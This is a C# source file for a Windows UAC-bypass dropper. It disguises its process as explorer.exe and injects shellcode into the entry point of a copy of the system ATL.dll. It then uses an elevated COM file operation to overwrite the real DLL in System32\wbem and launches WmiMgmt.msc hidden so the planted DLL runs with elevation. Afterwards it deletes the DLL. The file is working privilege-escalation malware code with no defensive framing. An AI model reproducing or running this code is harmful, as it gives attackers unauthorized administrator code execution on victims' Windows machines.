using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.WindowsAPICodePack.Shell;

namespace UACBypassDropper
{
    internal class Dropper
    {
        public static void Execute()
        {
            NativeMethods.CoInitializeEx(IntPtr.Zero, NativeMethods.COINIT_APARTMENTTHREADED | NativeMethods.COINIT_DISABLE_OLE1DDE);
            MasqueradeAsExplorer();
            string systemDir = Environment.GetFolderPath(Environment.SpecialFolder.System);
            string atlPath = Path.Combine(systemDir, "wbem", "ATL.dll");
            byte[] dllData = File.ReadAllBytes(atlPath);
            PatchEntryPoint(dllData);
            string dropperPath = Path.Combine(Directory.GetCurrentDirectory(), "dropper.dll");
            File.WriteAllBytes(dropperPath, dllData);
            MoveDLLWithElevation(dropperPath, atlPath);
            NativeMethods.ShellExecuteW(IntPtr.Zero, "open", "WmiMgmt.msc", null, null, NativeMethods.SW_HIDE);
            System.Threading.Thread.Sleep(2000);
            DeleteDLLWithElevation(atlPath);
            NativeMethods.CoUninitialize();
        }

        private static unsafe void MasqueradeAsExplorer()
        {
            NativeMethods.LdrEnumerateLoadedModules(0, (IntPtr entryPtr, IntPtr context, ref bool stop) =>
            {
                var entry = (LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(entryPtr, typeof(LDR_DATA_TABLE_ENTRY));
                if (entry.DllBase == NativeMethods.GetImageBase())
                {
                    string fakeName = "explorer.exe";
                    var fakeNameBuffer = Marshal.StringToHGlobalUni(fakeName);
                    entry.BaseDllName.Buffer = fakeNameBuffer;
                    entry.BaseDllName.Length = (ushort)(fakeName.Length * 2);
                    entry.BaseDllName.MaximumLength = (ushort)((fakeName.Length + 1) * 2);

                    string fakePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), fakeName);
                    var fakePathBuffer = Marshal.StringToHGlobalUni(fakePath);
                    entry.FullDllName.Buffer = fakePathBuffer;
                    entry.FullDllName.Length = (ushort)(fakePath.Length * 2);
                    entry.FullDllName.MaximumLength = (ushort)((fakePath.Length + 1) * 2);

                    Marshal.StructureToPtr(entry, entryPtr, true);
                    stop = true;
                    return true;
                }
                return false;
            }, IntPtr.Zero);
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct LDR_DATA_TABLE_ENTRY
        {
            public IntPtr Reserved1;
            public IntPtr Reserved2;
            public IntPtr DllBase;
            public UNICODE_STRING FullDllName;
            public UNICODE_STRING BaseDllName;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        private static void PatchEntryPoint(byte[] dllData)
        {
            int dosHeader = BitConverter.ToInt32(dllData, 0x3C);
            int peHeader = dosHeader;
            int entryPoint = BitConverter.ToInt32(dllData, peHeader + 0x28);
            int textSectionOffset = FindTextSection(dllData, peHeader);

            int shellcodeOffset = entryPoint - BitConverter.ToInt32(dllData, textSectionOffset + 12) + BitConverter.ToInt32(dllData, textSectionOffset + 20);

            byte[] shell = Shellcode.Payload;

            Array.Copy(shell, 0, dllData, shellcodeOffset, shell.Length);

            IntPtr createProcess = NativeMethods.GetProcAddress(NativeMethods.GetModuleHandle("kernel32.dll"), "CreateProcessW");
            IntPtr exitProcess = NativeMethods.GetProcAddress(NativeMethods.GetModuleHandle("kernel32.dll"), "ExitProcess");

            Buffer.BlockCopy(BitConverter.GetBytes(createProcess.ToInt64()), 0, dllData, shellcodeOffset + 0x71, 8);
            Buffer.BlockCopy(BitConverter.GetBytes(exitProcess.ToInt64()), 0, dllData, shellcodeOffset + 0x7F, 8);
        }

        private static int FindTextSection(byte[] data, int peHeader)
        {
            int sections = BitConverter.ToInt16(data, peHeader + 6);
            int sectionStart = peHeader + 0xF8;

            for (int i = 0; i < sections; i++)
            {
                int offset = sectionStart + (40 * i);
                string name = Encoding.ASCII.GetString(data, offset, 5);
                if (name.StartsWith(".text"))
                {
                    return offset;
                }
            }
            return 0;
        }

        private static void MoveDLLWithElevation(string sourcePath, string destPath)
        {
            var operation = NativeMethods.CreateElevatedFileOperation();
            var srcItem = NativeMethods.CreateShellItemFromPath(sourcePath);
            var dstItem = NativeMethods.CreateShellItemFromPath(destPath);

            operation.MoveItem(srcItem, dstItem, "ATL.dll", null);
            operation.SetOperationFlags(NativeMethods.FOF_NOCONFIRMATION | NativeMethods.FOFX_NOCOPYHOOKS | NativeMethods.FOFX_REQUIREELEVATION | NativeMethods.FOF_NOERRORUI);
            operation.PerformOperations();
        }

        private static void DeleteDLLWithElevation(string targetPath)
        {
            var operation = NativeMethods.CreateElevatedFileOperation();
            var targetItem = NativeMethods.CreateShellItemFromPath(targetPath);

            operation.DeleteItem(targetItem, null);
            operation.PerformOperations();
        }
    }
}
